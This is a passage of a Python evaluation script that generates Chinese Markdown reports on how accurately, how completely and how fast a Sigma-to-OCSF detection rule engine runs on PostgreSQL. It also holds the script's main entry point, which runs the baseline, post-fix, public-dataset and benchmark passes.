| 25 | `file_event_win_office_macro_files_from_susp_process.yml` | `EXECUTABLE` (误映射 `ParentImage -> file.name`，审计集 `FP={u25_pre["metrics"]["fp"]}, FN={u25_pre["metrics"]["fn"]}`) | **`UNSUPPORTED`** (`3/3` 用例显式拒绝) | `{{"Image": "actor.process.file.path", "ParentImage": "file.name", "TargetFilename": "file.path"}}` → 显式拒绝 `Unmapped Sigma field: 'ParentImage'` |
"""
        + "\n".join(transitions)
        + "\n"
    )
    (DOCS_OUT_DIR / "compatibility-report.md").write_text(compat_md, encoding="utf-8")

    # 4. correctness-report.md
    sem_rows = []
    pre_sem_by_id = {r["rule_id"]: r for r in pre["semantic_rules"]}
    for r in post["semantic_rules"]:
        m = r["metrics"]
        pm = pre_sem_by_id[r["rule_id"]]["metrics"]
        sem_rows.append(
            f"| `{r['dimension_id']}` | `{r['filename']}` | `{pr_state_str(pre_sem_by_id[r['rule_id']])}` → `{r['evaluation_state']}` "
            f"| {pm['tp']}/{pm['fp']}/{pm['fn']}/{pm['tn']} (ERR={pm['error_count']}) "
            f"| **{m['tp']}/{m['fp']}/{m['fn']}/{m['tn']}** (ERR={m['error_count']}) "
            f"| {_fmt_f(m['precision'])} | {_fmt_f(m['recall_executed'])} | **{_fmt_f(m['f1_executed'])}** | {_fmt_f(m['fpr_executed'])} |"
        )

    shq_rows = []
    for r in post["sigmahq_rules"]:
        if not r["cases"]:
            continue
        m = r["metrics"]
        pr = pre_shq_by_id[r["rule_id"]]
        pm = pr["metrics"]
        cov_tag = "Yes" if r["data_coverage"] else "Schema-Only"
        shq_rows.append(
            f"| {r['index']:02d} | `{r['domain_group']}` | `{r['filename']}` | `{r['mapped_class_uids']}` | {cov_tag} "
            f"| {pm['tp']}/{pm['fp']}/{pm['fn']}/{pm['tn']}/E{pm['error_count']} "
            f"| **{m['tp']}/{m['fp']}/{m['fn']}/{m['tn']}/E{m['error_count']}** "
            f"| {_fmt_f(m['precision'])} | {_fmt_f(m['recall_executed'])} | **{_fmt_f(m['f1_executed'])}** | {_fmt_f(m['fpr_executed'])} |"
        )

    pub_rows = []
    for d in pub["raw_log_datasets"]:
        hits_desc = (
            ", ".join(
                f"`{c['rule_file']}`={c['actual_matches']} ({'PASS' if c['detected'] else 'MISS'})"
                for c in d["known_attack_checks"]
            )
            or "无预期攻击标签（纯背景流量）"
        )
        pub_rows.append(
            f"| `{d['dataset_id']}` | `{d['source_type']}` | {d['ingest_total_count']} | {d['accepted_count']} | **{d['duplicate_count']}** "
            f"| {d['ingest_failed_count']} | {d['normalized_mapped_count']} | {d['normalized_passthrough_count']} "
            f"| {d['parse_or_normalize_failed_count']} | {d['ocsf_v140_structural_enum_invalid_count']} | {d['ocsf_v140_source_constraint_gaps_count']} | {d['total_rule_matches']} "
            f"| {d['unknown_unlabeled_mapped_events_not_counted_as_tn']} | {hits_desc} |"
        )
    xa = pub["xml_format_rejection_audit"]

    audit_rows = [
        f"| `{a['change_id']}` | `{a['affected_case']}` | `{a['old_expectation']}` | `{a['new_expectation']}` | {a['reason']} | {', '.join(a['normative_basis'])} |"
        for a in audit_log
    ]

    # Build per-rule independent report blocks for all 32 executable SigmaHQ rules
    per_rule_blocks: list[str] = []
    for r in post["sigmahq_rules"]:
        if not r["cases"]:
            continue
        m = r["metrics"]
        c_lines = "\n".join(
            f"  - `{c['test_event_id']}` (expected=`{c['expected_match']}` → outcome=`{c['outcome']}`, **{c['classification']}**): {c['expected_reason']}"
            for c in r["cases"]
        )
        per_rule_blocks.append(
            f"### #{r['index']:02d} `{r['filename']}` (`{r['rule_id']}`)\n"
            f"- **标题 / 等级 / 版本:** {r['rule_name']} · `{r['level']}` · `{r['version']}`\n"
            f"- **OCSF v1.4.0 映射:** `class_uid={r['mapped_class_uids']}` · `field_mappings={json.dumps(r['field_mappings'], sort_keys=True)}` · `static_data_coverage={r['data_coverage']}`\n"
            f"- **指标:** `TP={m['tp']}, FP={m['fp']}, FN={m['fn']}, TN={m['tn']}, ERROR={m['error_count']}` · `Precision={_fmt_f(m['precision'])}, Recall={_fmt_f(m['recall_executed'])}, F1={_fmt_f(m['f1_executed'])}, FPR={_fmt_f(m['fpr_executed'])}`\n"
            f"- **逐用例结果:**\n{c_lines}\n"
        )

    correctness_md = (
        """# 阶段四至五：检测正确性、统计口径对账与公开数据集报告

## 1. 上一版指标偏差溯源与本轮统计口径修正

1. **上一版基线 F1 数字不一致原因：**
   - 上一轮 `correctness-report.md` 表内基线计数为语义集 `TP/FP/FN=22/2/5`（按公式 `2*22/(44+2+5) = 0.8627`）与 SigmaHQ 集 `61/1/5`（按公式 `2*61/(122+1+5) = 0.9531`），而口头回复摘要误写为手工计算错值 `0.8519 / 0.9524`。
   - 同时，上一轮评估脚本将编译/SQL 异常（`D05`, `D14`, `#08`, `#12`）返回的空命中列表当作 `actual=False`，错误地把异常规则下的负例计入 `TN`、正例计入 `FN`，并将 `#25` 的 3 条拒绝审计用例混入总用例数。
   - **本轮根治措施：** 统一采用四态结果（`MATCH` / `NO_MATCH` / `ERROR` / `UNSUPPORTED`），`ERROR` 单列且绝不计入 `TN`，`#25` 拒绝审计、`robustness_oracle` 与 `legacy_compat_oracle` 分表独立统计，所有 Markdown 表格均由 `run_evaluation.py` 从唯一 `evaluation-results.json` 自动生成。
2. **框架异常吞没修复：**
   - `src/provloom/detection/service.py` (`test_detection_rule`)：捕获 SQL 执行异常时，现显式返回 `RuleStatus.ERROR` 与 `execution_success=False`（此前返回原 `ENABLED` 状态且 `execution_success=None`）。
   - `src/provloom/storage/postgres/uow.py` (`_sqlite_regexp`)：移除 `except re.error: return 0`，禁止将非法正则静默转为 `False`。

## 2. Oracle 修订审计记录（含 BUG-03 `|base64` vs `|cased` 重审）

| 变更 ID | 涉及用例 / 规则 | 旧预期 | 新预期 | 修改原因 | 规范依据 |
| :--- | :--- | :--- | :--- | :--- | :--- |
"""
        + "\n".join(audit_rows)
        + """

## 3. 人工构造标准 OCSF `v1.4.0` 语义套件逐维结果（15 维，59 用例）

| 维度 | 规则文件 | 状态变化 | 基线 TP/FP/FN/TN | 修正后 TP/FP/FN/TN | Precision | Recall | F1 | FPR |
| :--- | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
"""
        + "\n".join(sem_rows)
        + f"""
| **合计** | **15 条语义规则** | — | **{prs["tp"]}/{prs["fp"]}/{prs["fn"]}/{prs["tn"]} (ERR={prs["error_count"]})** | **{ps["tp"]}/{ps["fp"]}/{ps["fn"]}/{ps["tn"]} (ERR={ps["error_count"]})** | **{_fmt_f(ps["precision"])}** | **{_fmt_f(ps["recall_executed"])}** | **{_fmt_f(ps["f1_executed"])}** | **{_fmt_f(ps["fpr_executed"])}** |

## 4. 32 条可执行 SigmaHQ 社区规则逐规则正确性结果（133 标准 OCSF `v1.4.0` 用例）

| # | 类别 | 规则文件 | OCSF Class | Raw 映射覆盖 | 基线 TP/FP/FN/TN/ERR | 修正后 TP/FP/FN/TN/ERR | Precision | Recall | F1 | FPR |
| :---: | :--- | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
"""
        + "\n".join(shq_rows)
        + f"""
| **合计** | **32 条规则** | — | — | **21 Raw / 11 Schema-Only** | **{prg["tp"]}/{prg["fp"]}/{prg["fn"]}/{prg["tn"]}/E{prg["error_count"]}** | **{pg["tp"]}/{pg["fp"]}/{pg["fn"]}/{pg["tn"]}/E{pg["error_count"]}** | **{_fmt_f(pg["precision"])}** | **{_fmt_f(pg["recall_executed"])}** | **{_fmt_f(pg["f1_executed"])}** | **{_fmt_f(pg["fpr_executed"])}** |

## 5. 公开数据集端到端测试与全量记录守恒对账

每份数据集均通过严格守恒断言：
1. `ingest_total == accepted + duplicate + ingest_failed`
2. `accepted == mapped + passthrough + parse_or_normalize_failed`

（注：上一轮 `otrf_lsass_comsvcs_t1003_001` 的 `51` 行输入中含 **1 条完全重复原始记录** `duplicate_count=1`，故 `accepted=50 = 6 mapped + 20 passthrough + 24 parse_failed`，现已完整列示对账；所有无标签背景事件均标记为 `UNKNOWN`，不计入 `TN`。此外，公开原始数据集上的 `OCSF 结构/枚举错误 = 0`，而 Sysmon EID 22 原生不含端点且 OTRF 使用 `Hostname` 而非 `Computer`，源日志缺失导致的 `at_least_one` 约束缺口单独列示、**绝不在归一化层伪造字段**。）

| 数据集 ID | 源类型 | 输入总行数 | 接收 (`accepted`) | **去重 (`duplicate`)** | 接入失败 (`ingest_fail`) | OCSF 映射 (`MAPPED`) | 兜底透传 (`class_uid=0`) | 解析/归一化失败 | OCSF 结构/枚举错误 | 源日志约束缺口 (`at_least_one`) | 总命中 `RuleMatch` | `UNKNOWN` 背景事件 | 已知攻击检出核验 |
| :--- | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
"""
        + "\n".join(pub_rows)
        + f"""
| `{xa["dataset_id"]}` | `sysmon (XML)` | {xa["ingest_total_count"]} | {xa["accepted_count"]} | {xa["duplicate_count"]} | {xa["ingest_failed_count"]} | 0 | 0 | {xa["recorded_pipeline_failures"]} | 0 | 0 | 0 | 0 | 非 JSONL 的原始 XML 行 100% 记入 `pipeline_failures`，零静默丢数 |

## 6. 32 条可执行 SigmaHQ 规则独立测试报告

"""
        + "\n".join(per_rule_blocks)
    )
    (DOCS_OUT_DIR / "correctness-report.md").write_text(correctness_md, encoding="utf-8")

    # 4b. test-plan.md
    test_plan_md = f"""# ProvLoom Sigma 兼容性与正确性评测方案（OCSF v1.4.0）

## 1. 目标与规范基线

- **OCSF 规范版本：** `v{PINNED_OCSF_VERSION}`（官方 `https://github.com/ocsf/ocsf-schema` tag `{PINNED_OCSF_TAG}`，commit `{PINNED_OCSF_COMMIT}`）。
- **Schema 校验器：** `tests/evaluation/ocsf_validator.py`（基于离线快照 `tests/evaluation/fixtures/ocsf_v1_4_0_schema.json`），强制校验全部 `192` 条标准合成事件（`59` 语义 + `133` SigmaHQ）与全部 `9` 个内置映射事件类（`1001, 1007, 3002, 4001, 4003, 5001, 6001, 6002, 6003`）+ `0` + `1009`。
- **Sigma 修饰符规范：** Sigma Modifiers Specification `v2.1.0` 与 `pySigma {env["packages"]["pysigma"]}`。
- **社区规则基线：** `SigmaHQ/sigma` commit `{env["pinned_specifications"]["sigmahq_commit"]}`（45 条原版 YAML，零修改）。

## 2. 测试数据集分层设计

1. **标准 OCSF `v1.4.0` 执行集（`192` 用例）：**
   - `tests/evaluation/rule_semantics/semantic_oracle.json`：`15` 个语法/修饰符维度，`59` 条用例（含 `answers[].rdata` 精确/包含/否定/多元素/空数组/缺失/兄弟属性反例，`plain` vs `|base64` vs `|cased` vs `|base64|cased` 独立大小写用例，以及 JSON `null` 下的 `|exists`）。
   - `tests/evaluation/ground_truth/sigmahq_ground_truth.json`：`32` 条受支持社区规则，`133` 条用例（含 `1009` `script.script_content.value` 与 `4003` `answers[].rdata` 兄弟属性隔离反例）。
2. **不支持规则拒绝审计集（`3` 用例，单独统计）：**
   - `tests/evaluation/ground_truth/unsupported_audit_oracle.json`（`#25` `ParentImage` 拒绝审计）。
3. **非法输入健壮性测试集（`4` 用例，单独统计）：**
   - `tests/evaluation/ground_truth/robustness_oracle.json`（刻意违反 OCSF `v1.4.0` 类型契约，验证零 SQL 崩溃且返回 `NO_MATCH`）。
4. **历史 OCSF `v1.3.0` 输入兼容测试集（`4` 用例 + 重放转换测试，单独统计）：**
   - `tests/evaluation/ground_truth/legacy_compat_oracle.json`（验证重放前 `answers` 字符串数组/标量兼容路径，以及 `trigger_replay` 在保持 `raw_events` 不变的前提下将派生事件升级为 `1.4.0` `answers[].rdata`）。
5. **公开真实数据集：** `ocsf/examples`、`OTRF Security-Datasets`、`Splunk Attack Data`（未知背景流量一律记为 `UNKNOWN`，绝不计入 `TN`）。

## 3. 四态统计口径

每个用例输出唯一状态：`MATCH`、`NO_MATCH`、`ERROR`、`UNSUPPORTED`。`ERROR` 绝不计入 `TN`；`UNSUPPORTED` 单独列示；所有报告表格均由 `tests/evaluation/run_evaluation.py` 从 `evaluation-results.json` 自动生成。
"""
    (DOCS_OUT_DIR / "test-plan.md").write_text(test_plan_md, encoding="utf-8")

    # 5. unsupported-rules.md
    unsup_rows = []
    cov_gap_rows = []
    for r in post["sigmahq_rules"]:
        if r["evaluation_state"] == "UNSUPPORTED":
            unsup_rows.append(
                f"| {r['index']:02d} | `{r['domain_group']}` | `{r['filename']}` | `{r['rule_id']}` | {'; '.join(r['unsupported_reasons'])} |"
            )
        elif not r["data_coverage"]:
            cov_gap_rows.append(
                f"| {r['index']:02d} | `{r['domain_group']}` | `{r['filename']}` | `{r['mapped_class_uids']}` | `{', '.join(r['uncovered_fields'])}` |"
            )

    unsup_md = (
        f"""# 不支持规则与原始日志字段覆盖缺口报告

## 1. 编译器显式拒绝的规则（`status = UNSUPPORTED`，共 {len(unsup_rows)} / 45 条）

全部 {len(unsup_rows)} 条不支持规则均在能力检查阶段显式返回 `RuleStatus.UNSUPPORTED` 及具体原因，零静默忽略条件。

| # | 领域 | 规则文件 | Rule ID | 显式拒绝原因 (`unsupported_reasons`) |
| :---: | :--- | :--- | :--- | :--- |
"""
        + "\n".join(unsup_rows)
        + f"""

## 2. 标准 OCSF `v1.4.0` 事件层可执行、但内置原始日志 YAML 映射尚未覆盖的规则（`DATA_COVERAGE = False`，共 {len(cov_gap_rows)} / 32 条）

以下 {len(cov_gap_rows)} 条规则在标准 OCSF `v1.4.0` 输入上 `100%` 编译并正确执行，但当前内置 `configs/mappings/*.yaml` 尚未从原始日志提取对应字段或事件类，因此静态 `DATA_COVERAGE=False` 与端到端原始日志覆盖分开报告：

| # | 领域 | 规则文件 | 目标 `class_uid` | 缺失的内置原始日志映射字段 (`uncovered_fields`) |
| :---: | :--- | :--- | :---: | :--- |
"""
        + "\n".join(cov_gap_rows)
        + "\n"
    )
    (DOCS_OUT_DIR / "unsupported-rules.md").write_text(unsup_md, encoding="utf-8")

    # 6. performance-report.md
    cm = perf["single_rule_compile_ms"]
    sm = perf["single_rule_readonly_exec_10k_ms"]
    cold = perf["cold_first_run"]
    warm = perf["warm_idempotent_reruns_summary"]
    det = perf["determinism_5x"]
    res_u = perf["resource_usage"]
    run_rows = [
        f"| Run #{r['run_index']} | `{r['mode']}` | {r['wall_ms']:.3f} | {r['cpu_ms']:.3f} | {r['matches_created']} | {r['matches_deduplicated']} | {r['signals_created']} | {r['total_stored_rule_matches']} | {r['rule_evaluations_per_sec']:.2f} | {r['event_rule_checks_per_sec']:.2f} |"
        for r in det["per_run_records"]
    ]

    perf_md = (
        f"""# 工程性能与 5x 确定性报告（PostgreSQL 16 实测）

## 1. 计量单位定义

- **测试数据规模：** 单租户写入 `{perf["dataset_size_events"]}` 条通过 OCSF `v1.4.0` 校验的事件（覆盖 `1007, 1001, 4001, 3002, 4003, 1009`），导入全部 `{perf["evaluated_supported_rules"]}` 条受支持 SigmaHQ 规则。
- **`rule_evaluations_per_sec`（规则评估吞吐）：** `已评估规则数 (32) / 批处理挂钟耗时(秒)`，每条规则对 `10,000` 条事件执行一次完整参数化 SQL 查询与匹配归集。
- **`event_rule_checks_per_sec`（逻辑事件-规则对检查吞吐）：** `(32 × 10,000) / 批处理挂钟耗时(秒)`。
- **冷热区分：** 第 1 轮为**首次冷执行 (`cold_first_run`)**（包含新建 `RuleMatch`、`Signal`、`CandidateGroup` 落库写入开销）；第 2～5 轮为**幂等重跑 (`warm_idempotent_rerun`)**（验证唯一键幂等去重与结果稳定性）。

## 2. 单条规则编译与只读查询耗时分布（32 条规则 × 10,000 事件）

| 阶段 | Min (ms) | P50 (ms) | P95 (ms) | P99 (ms) | Max (ms) | Mean (ms) |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
| **单规则编译 (`Sigma -> OCSF v1.4.0 -> SQL`)** | {cm["min"]:.4f} | {cm["p50"]:.4f} | {cm["p95"]:.4f} | {cm["p99"]:.4f} | {cm["max"]:.4f} | {cm["mean"]:.4f} |
| **单规则 PostgreSQL 只读查询 (`10,000` 事件)** | {sm["min"]:.4f} | {sm["p50"]:.4f} | {sm["p95"]:.4f} | {sm["p99"]:.4f} | {sm["max"]:.4f} | {sm["mean"]:.4f} |

## 3. 首次冷执行 vs 幂等重跑（连续 5 轮确定性验证）

| 轮次 | 执行模式 | 挂钟耗时 (ms) | CPU 耗时 (ms) | 新建 `RuleMatch` | 幂等去重 `RuleMatch` | 新建 `Signal` | 库内总 `RuleMatch` | `rule_evaluations/s` | `event_rule_checks/s` |
| :---: | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
"""
        + "\n".join(run_rows)
        + f"""

- **首次冷执行 (`Run #1`)：** 耗时 `{cold["wall_ms"]:.3f} ms`，`{cold["rule_evaluations_per_sec"]:.2f} rule_evaluations/s`（`{cold["event_rule_checks_per_sec"]:.2f} event_rule_checks/s`），新建 `{cold["matches_created"]}` 条 `RuleMatch` 与 `{cold["signals_created"]}` 条 `Signal`。
- **幂等重跑 (`Runs #2..#5` 均值)：** 平均耗时 `{warm["wall_ms"]["mean"]:.3f} ms`（P50 `{warm["wall_ms"]["p50"]:.3f} ms`，P95 `{warm["wall_ms"]["p95"]:.3f} ms`），平均 `{warm["mean_rule_evaluations_per_sec"]:.2f} rule_evaluations/s`（`{warm["mean_event_rule_checks_per_sec"]:.2f} event_rule_checks/s`）。
- **确定性核验结论：** 5 轮库内 `(primary_event_id, rule_id)` 集合完全一致 = **`{det["identical_match_sets"]}`**，重复 `RuleMatch` 数 = **`{det["duplicate_rule_matches_in_db"]}`**。
- **资源占用：** Python 进程峰值 RSS `{res_u["python_process_peak_rss_mib"]} MiB`（增量 `{res_u["python_process_rss_delta_mib"]} MiB`），5 轮累计 CPU 时间 `{res_u["python_process_cpu_seconds_5_runs"]} s`。
"""
    )
    (DOCS_OUT_DIR / "performance-report.md").write_text(perf_md, encoding="utf-8")

    # 7. recommendations.md
    rec_md = """# 未解决问题与后续演进建议（不阻塞当前 OCSF v1.4.0 契约）

## 1. 当前已知范围边界与未解决问题

1. **原始日志解析与 YAML 映射覆盖缺口（`11 / 32` 条可执行规则 `DATA_COVERAGE=False`）：**
   - `configs/mappings/sysmon_process_create_1007.yaml` 尚未提取 Sysmon `OriginalFileName -> process.file.internal_name`、`CurrentDirectory -> process.working_directory`、`Description -> process.file.desc`（影响 `#01, #02, #06, #09, #12` 的原始日志分支，其中 `#09` 完全依赖 `OriginalFileName`）。
   - 尚未内置 Windows PowerShell Operational `EventID 4104 / 4103` 解析器与 `1009` 映射配置（影响 `#17, #18` 原始日志端到端接入）。
   - `sysmon_network_connect_4001.yaml` / `auth_logon_3002.yaml` / `sysmon_dns_4003.yaml` 尚未映射 `DestinationHostname`、`WorkstationName`、`QueryType`（影响 `#29, #30, #36, #44` 的原始日志字段提取）。
   - OTRF / NXLog 导出的 Sysmon JSONL 使用 `Hostname` 而非 `Computer`，当前 `sysmon` 解析/映射仅绑定 `Computer`。
2. **明确继续显式拒绝的 Sigma 能力（`13 / 45` 条 `UNSUPPORTED`）：**
   - 高级修饰符：`SigmaFieldReferenceModifier` (`|fieldref`)、`SigmaCIDRModifier` (`|cidr`)、`SigmaBase64OffsetModifier` (`|base64offset`)、`SigmaExpandModifier` (`|expand`)。
   - 未映射日志源与专有字段：Windows `ps_classic_start`、Kerberos `4768`、Zeek 无 `category` 的 `service: dns`、Sysmon `Initiated` / `Product` / `LogonProcessName` / `SubjectUserSid` / `KeyLength`、以及 `file_event` 上的非 Sysmon 字段 `ParentImage`。
   - 超出 PostgreSQL POSIX ARE `DUPMAX=255` 的多字符分组量词（如 `(?:abc){1,300}`）以及 Sigma Correlation / `timeframe` 聚合规则（MVP 范围外）。
3. **工程性能特征：**
   - 当前单事件 SQL 查询对 JSONB 文本路径使用 `lower(ocsf_payload #>> ...) LIKE ...` 顺序扫描租户时间窗内的目标 `class_uid` 分区；在 10,000 事件规模下单规则 P50 约数毫秒，若扩展至百万级事件建议按高频路径增加 `pg_trgm` / 表达式 GIN 索引。

## 2. 下一阶段优先级建议

- **P1（补齐原始日志映射）：** 扩展 `sysmon_process_create_1007.yaml`（`OriginalFileName`、`CurrentDirectory`、`Hostname` 别名）与 `sysmon_dns_4003.yaml`（`QueryType`），新增 PowerShell `4104 -> 1009 (script.script_content.value)` 解析器与 YAML 映射。
- **P2（高价值修饰符支持）：** 基于 PostgreSQL 原生 `inet <<= cidr` 支持 `|cidr`（激活 `#32, #38`），基于三偏移子串支持 `|base64offset`（激活 `#16`），基于同事件双列对比支持 `|fieldref`（激活 `#11, #26`）。
"""
    (DOCS_OUT_DIR / "recommendations.md").write_text(rec_md, encoding="utf-8")


def pr_state_str(r: dict[str, Any]) -> str:
    return str(r["evaluation_state"])


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Run reproducible ProvLoom Sigma evaluation on PostgreSQL 16 and generate canonical JSON + reports."
    )
    parser.add_argument("--pg-url", default=os.getenv("PROVLOOM_EVAL_PG_URL", DEFAULT_PG_EVAL_URL))
    parser.add_argument("--perf-events", type=int, default=10000)
    args = parser.parse_args()

    print(f"[1/6] Collecting environment & specification provenance on {args.pg_url} ...")
    env_meta = collect_environment_metadata(args.pg_url)

    print(
        "[2/6] Running baseline git HEAD (0944102) via isolated git worktree on PostgreSQL 16 ..."
    )
    pre_res = run_baseline_via_git_worktree(args.pg_url)

    print("[3/6] Running post-fix OCSF v1.4.0 evaluation on PostgreSQL 16 ...")
    post_res = run_single_engine_pass(args.pg_url, "eval_postfix_v140")

    print(
        "[4/6] Running robustness (malformed inputs) and historical v1.3.0 compatibility suites ..."
    )
    aux_res = evaluate_auxiliary_suites(args.pg_url)

    print("[5/6] Running public datasets with full record conservation audit ...")
    pub_res = evaluate_public_datasets_with_full_conservation(args.pg_url)

    print(
        f"[6/6] Running {args.perf_events}-event cold vs warm performance & 5x determinism benchmark ..."
    )
    perf_res = benchmark_performance_and_determinism(args.pg_url, event_count=args.perf_events)

    canonical_bundle = {
        "schema_contract_version": PINNED_OCSF_VERSION,
        "environment": env_meta,
        "baseline_head_0944102": pre_res,
        "postfix_v140": post_res,
        "auxiliary_suites": aux_res,
        "public_datasets": pub_res,
        "performance_and_determinism": perf_res,
    }

    DOCS_OUT_DIR.mkdir(parents=True, exist_ok=True)
    CANONICAL_JSON_PATH.write_text(
        json.dumps(canonical_bundle, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )
    generate_markdown_reports(canonical_bundle)
    print(f"Done! Canonical results written to {CANONICAL_JSON_PATH}")
    print(
        "Summary (Post-Fix OCSF v1.4.0):",
        json.dumps(post_res["combined_standard_execution_metrics"]),
    )
    print(
        "Summary (Baseline 0944102 on identical OCSF v1.4.0 suite):",
        json.dumps(pre_res["combined_standard_execution_metrics"]),
    )


if __name__ == "__main__":
    main()
